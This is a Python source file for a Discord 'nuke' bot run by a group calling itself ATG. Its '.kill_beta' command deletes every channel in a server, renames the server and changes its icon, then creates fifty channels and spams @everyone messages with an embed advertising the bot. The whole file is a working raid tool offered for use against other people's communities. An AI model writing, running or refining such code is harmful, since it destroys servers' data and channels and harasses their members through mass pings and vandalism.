
import discord
import aiohttp
import asyncio
import json
from discord.ext import commands
import time
import random


blacklisted_servers = []


token = 'token'
headers = {'Authorization': f'Bot {token}', 'Content-Type': 'application/json'}

intents = discord.Intents.all()
intents.guilds = True
intents.messages = True
bot = commands.Bot(command_prefix='.', intents=intents)

   
NUM_MESSAGES_PER_CHANNEL = 26
amount = 50 
channel_name = 'atg owns ts'
webhook_name = 'Atg'
server_name = 'atg owns ts'
COOLDOWN_DURATION = 300 # cooldown
server_cooldowns = {}
messages_list = [ 
    "Nuked By Atg",
    "Raided By Atg",
    "Atg On Top",
]
pfp_url = '' 

async def delete_channel(channel):
    try:
        await channel.delete()
        print(f'Deleted channel #{channel.name}')
    except Exception as e:
        print(f'Error deleting channel #{channel.name}: {e}')

async def delete_all_channels(guild):
    delete_tasks = [asyncio.create_task(delete_channel(channel)) for channel in guild.channels]

    await asyncio.gather(*delete_tasks)

async def create_channel(guild_id):
    url = f'https://discord.com/api/v9/guilds/{guild_id}/channels'

    payload = {
        'name': (channel_name),
        'type': 0,
    }

    async with aiohttp.ClientSession() as session:
        async with session.post(url, data=json.dumps(payload), headers=headers) as response:
            print(f'Guild {guild_id}: {response.status}')

async def create_webhook(channel):
    url = f'https://discord.com/api/v9/channels/{channel.id}/webhooks'

    payload = {
        'name': (webhook_name),
    }

    async with aiohttp.ClientSession() as session:
        async with session.post(url, data=json.dumps(payload), headers=headers) as response:
            print(f'Webhook creation for Channel {channel.name}: {response.status}')
            if response.status == 200:
                await send_messages(channel)


async def send_messages(channel):
    embed_message = discord.Embed(
        title='Nuked By ATG',
        description='Join our Discord to use this nuke bot **for FREE!**',
    )
    embed_message.set_image(url='')
    embed_message.set_footer(text='ATG Was Here!',
                             icon_url='')

    for i in range(NUM_MESSAGES_PER_CHANNEL):
        random_message = random.choice(messages_list)

        try:
            await channel.send(content=f'@everyone @here {random_message}', embed=embed_message)
            print(f'Sent messages to: #{channel.name}')
        except Exception as e:
            print(f'Error sending message to #{channel.name}: {e}')


@bot.command()
async def kill_beta(ctx):
    guild_id = ctx.guild.id
    last_processed_time = server_cooldowns.get(guild_id, 0)
    current_time = int(time.time() * 1000)

    if current_time - last_processed_time < COOLDOWN_DURATION:
        print(f'Guild {guild_id} is on cooldown. Skipping.')
        return

    server_cooldowns[guild_id] = current_time

    guild = ctx.guild
    await delete_all_channels(guild)
    await guild.edit(name=(server_name))
    async with aiohttp.ClientSession() as session:
        async with session.get(pfp_url) as resp:
            if resp.status == 200:
                pfp_data = await resp.read()
                await guild.edit(icon=bytes(pfp_data))
            else:
                print(f"Failed to fetch profile picture, status: {resp.status}")
    
    tasks = [create_channel(guild_id) for _ in range(amount)]
    await asyncio.gather(*tasks)

    tasks = [create_webhook(channel) for channel in guild.channels if channel.type == discord.ChannelType.text]
    await asyncio.gather(*tasks)

bot.run(token)
